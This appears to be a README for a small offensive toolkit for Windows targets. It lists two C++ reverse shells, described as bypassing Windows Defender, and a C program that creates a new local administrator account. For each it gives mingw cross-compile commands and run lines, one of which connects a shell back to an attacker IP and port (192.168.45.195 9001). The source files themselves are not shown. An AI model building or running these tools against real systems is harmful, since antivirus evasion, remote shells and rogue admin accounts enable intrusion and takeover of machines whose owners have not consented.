## revshell.cpp
Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target.

*Note: The IP and PORT need to be specified statically in the file before compilation*

- Compile in linux with: `x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++`
- Execute: `.\rev.exe`

## revshell2.cpp
Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target.

*Note: The executable takes IP and PORT as arguments*

- Compile in linux with: `x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++`
- Execute: `rev.exe 192.168.45.195 9001`

## newadmin.c
Will create new local admin.

- Create a 32-bit EXE file: `i686-w64-mingw32-gcc -oadduser32.exe adduser.c -lnetapi32`
- Create a 64-bit EXE file: `x86_64-w64-mingw32-gcc -oadduser64.exe adduser.c -lnetapi32`
